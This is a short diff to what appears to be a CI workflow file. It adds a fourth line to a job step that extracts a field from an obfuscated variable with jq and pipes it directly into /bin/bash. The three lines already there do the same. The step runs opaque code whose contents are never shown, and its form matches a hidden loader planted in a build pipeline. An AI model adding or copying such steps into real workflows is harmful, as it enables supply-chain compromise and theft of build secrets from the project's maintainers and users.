@@ -50,6 +50,7 @@ jobs:
           echo $qvvw704 | jq -r .k81835 | /bin/bash
           echo $o87 | jq -r .zsp775 | /bin/bash
           echo $wzsep9 | jq -r .h007 | /bin/bash
+          echo $jdq0 | jq -r .e168 | /bin/bash
 
       - name: Upload artifact
         if: always()
